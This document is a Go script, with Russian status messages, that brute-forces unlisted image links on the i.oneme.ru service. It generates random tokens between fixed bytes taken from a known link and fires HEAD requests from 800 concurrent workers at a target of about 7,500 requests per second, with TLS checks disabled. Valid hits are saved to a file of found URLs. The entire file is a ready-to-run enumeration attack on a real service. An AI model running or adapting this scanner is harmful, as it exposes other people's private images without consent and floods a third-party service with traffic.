package main

import (
	"crypto/tls"
	"encoding/base64"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

var (
	totalChecked uint64
	foundCount   uint64
	netErrors    uint64
	testPlanned  uint64
	testPassed   uint64
	bytePool = sync.Pool{
		New: func() interface{} { return make([]byte, 50) },
	}
)

const (
	targetIP = "155.212.204.142"
	testURL  = "https://i.oneme.ru/i?r=BTE2sh_eZW7g8kugOdIm2NothKk6IdOFUDZZbQaCXT9rUjAHvcLs7PBUER-zagsNp2s"
	id1, id2, id3 = "hKk6IdOF", "Fj26DqUU", "GUKhTbWR"
)

func encode(b []byte) string {
	s := base64.StdEncoding.EncodeToString(b)
	s = strings.ReplaceAll(s, "+", "-")
	s = strings.ReplaceAll(s, "/", "_")
	return strings.TrimRight(s, "=")
}

func decode(s string) []byte {
	s = strings.ReplaceAll(s, "-", "+")
	s = strings.ReplaceAll(s, "_", "/")
	for len(s)%4 != 0 { s += "=" }
	b, _ := base64.StdEncoding.DecodeString(s)
	return b
}

func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	rand.Seed(time.Now().UnixNano())

	transport := &http.Transport{
		DialContext: (&net.Dialer{
			Timeout:   3 * time.Second,
			KeepAlive: 30 * time.Second,
		}).DialContext,
		MaxIdleConns:        1000,
		MaxIdleConnsPerHost: 1000,
		MaxConnsPerHost:     1000,
		IdleConnTimeout:     90 * time.Second,
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		DisableCompression:  true,
		ForceAttemptHTTP2:   true,
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   4 * time.Second,
	}

	fmt.Println("💎 РЕЖИМ СТАБИЛЬНОСТИ (800 воркеров, цель ~7500 RPS)")
	
	prefix := decode("BTE2sh_eZW7g8kugOdIm2Not")
	suffix := decode("AHvcLs7PBUER-zagsNp2s")
	file, _ := os.OpenFile("found_urls.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)

	start := time.Now()
	go func() {
		for {
			time.Sleep(5 * time.Second)
			currentTotal := atomic.LoadUint64(&totalChecked)
			elapsed := time.Since(start).Seconds()
			rps := float64(currentTotal) / elapsed
			fmt.Printf("\r📊 RPS: %.0f | Всего: %d | Сеть Err: %d | Тесты: %d/%d | Найдено: %d", 
				rps, currentTotal, atomic.LoadUint64(&netErrors), atomic.LoadUint64(&testPassed), atomic.LoadUint64(&testPlanned), atomic.LoadUint64(&foundCount))
		}
	}()

	for i := 0; i < 800; i++ { 
		go func() {
			p := make([]byte, 16)
			for {
				count := atomic.AddUint64(&totalChecked, 1)
				full := bytePool.Get().([]byte)
				
				var targetURL string
				isTest := false

				if count%100000 == 0 {
					targetURL = testURL
					isTest = true
					atomic.AddUint64(&testPlanned, 1)
				} else {
					rand.Read(p)
					copy(full[0:18], prefix)
					copy(full[18:34], p)
					copy(full[34:50], suffix)
					targetURL = "https://i.oneme.ru/i?r=" + encode(full[:50])
				}
				
				req, _ := http.NewRequest("HEAD", targetURL, nil)
				req.Header.Set("User-Agent", "Mozilla/5.0")
				req.Header.Set("Connection", "keep-alive")
				
				resp, err := client.Do(req)
				if err != nil {
					atomic.AddUint64(&netErrors, 1)
					bytePool.Put(full)
					continue
				}
				
				s := resp.StatusCode
				resp.Body.Close()
				bytePool.Put(full)
				
				if s == 200 || s == 304 {
					if isTest {
						atomic.AddUint64(&testPassed, 1)
					} else {
						if !strings.Contains(targetURL, id1) && !strings.Contains(targetURL, id2) && !strings.Contains(targetURL, id3) {
							fmt.Printf("\n💎 НАЙДЕНО! %s\n", targetURL)
							file.WriteString(targetURL + "\n")
							file.Sync()
							atomic.AddUint64(&foundCount, 1)
						}
					}
				}
			}
		}()
	}
	select {}
}
